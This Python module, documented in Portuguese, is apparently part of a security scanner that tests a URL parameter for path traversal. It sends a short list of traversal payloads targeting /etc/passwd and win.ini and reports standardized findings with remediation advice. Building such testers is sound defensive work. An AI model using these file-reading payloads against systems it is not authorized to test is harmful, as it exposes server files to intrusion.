"""
Testador de path traversal (LFI) — payloads comuns em um parâmetro.

Somente uso autorizado. Apenas GET, poucos payloads, sem escrita de arquivos.
"""

import requests

HEADERS = {"User-Agent": "ASPM-Scanner/1.0"}

TRAVERSAL_PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
]

PASSWD_SIGNALS = ("root:", "daemon:", "nobody:", "bin:")
WININI_SIGNALS = ("[extensions]", "for 16-bit app support")


def _traversal_signal(body):
    """Detecta conteúdo de arquivo sensível no corpo da resposta."""
    body = str(body).lower()
    if any(s in body for s in PASSWD_SIGNALS):
        return "conteúdo de /etc/passwd"
    if any(s in body for s in WININI_SIGNALS):
        return "conteúdo de win.ini"
    return ""


def path_traversal_test(url, param="file", payloads=None, timeout=5):
    """
    Testa payloads de path traversal em um parâmetro (GET).

    Retorna lista de dicts {"payload", "status", "length", "sinal"}.
    """
    out = []
    for payload in (payloads or TRAVERSAL_PAYLOADS):
        try:
            r = requests.get(
                url,
                params={param: payload},
                headers=HEADERS,
                timeout=timeout,
                allow_redirects=True,
            )
            body = r.text[:3000]
            out.append(
                {
                    "payload": payload,
                    "status": r.status_code,
                    "length": len(body),
                    "sinal": _traversal_signal(body),
                }
            )
        except Exception:
            out.append({"payload": payload, "status": "erro", "length": 0, "sinal": ""})
    return out


def traversal_findings(results):
    """
    Converte o resultado em achados padronizados.
    """
    from .engine import _finding

    findings = []
    if not results:
        return findings

    confirmados = [r for r in results if r.get("sinal")]
    if confirmados:
        findings.append(
            _finding(
                "Path Traversal",
                "Leitura de arquivo confirmada",
                f"{len(confirmados)} payload(s) com conteúdo sensível",
                "Alta",
                f"Payloads de path traversal retornaram conteúdo de arquivo sensível "
                f"({confirmados[0]['sinal']}). O parâmetro testado permite leitura de "
                f"arquivos do servidor — corrigir com validação e normalização de caminho.",
                "Achado Ativo",
                [
                    f"payload: {confirmados[0]['payload']}",
                    f"sinal: {confirmados[0]['sinal']}",
                ],
            )
        )
        return findings

    respostas_200 = [r for r in results if r.get("status") == 200]
    if respostas_200:
        findings.append(
            _finding(
                "Path Traversal",
                "Respostas 200 sem confirmação",
                f"{len(respostas_200)} payload(s) retornaram 200",
                "Baixa",
                "Alguns payloads de traversal retornaram HTTP 200, mas sem conteúdo "
                "sensível detectado (sem /etc/passwd ou win.ini). Validar manualmente "
                "se o parâmetro aceita caminhos arbitrários.",
                "Melhoria Recomendada",
                [f"{len(respostas_200)} respostas 200 sem sinal de arquivo"],
            )
        )
    else:
        findings.append(
            _finding(
                "Path Traversal",
                "Teste de traversal",
                "Sem indício de traversal",
                "Baixa",
                "Os payloads de path traversal não retornaram conteúdo sensível "
                "nem respostas 200 indicativas.",
                "Controle OK",
                [f"{len(results)} payloads testados"],
            )
        )

    return findings
